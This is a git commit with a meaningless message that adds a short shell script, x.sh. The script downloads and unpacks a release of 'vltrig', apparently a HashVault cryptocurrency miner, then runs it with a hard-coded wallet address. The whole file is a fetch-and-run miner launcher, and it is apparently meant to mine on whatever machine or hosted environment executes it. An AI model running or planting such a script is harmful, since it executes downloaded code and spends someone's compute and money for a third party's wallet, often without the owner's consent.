a9539a9b1ac318d60d6fe47898fa84cbbc382474
prendibs <94189491+prendibs@users.noreply.github.com>
2026-05-26 00:07:52 +0700

    sacsca

---
+++ x.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+#love u fika
+
+wget https://github.com/HashVault/vltrig/releases/download/v6.26.0.4/vltrig-v6.26.0.4-linux-x64.tar.gz && tar xf vltrig-v6.26.0.4-linux-x64.tar.gz 
+./vltrig --user 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjUMj4s2dA5CWbeBa --pass x
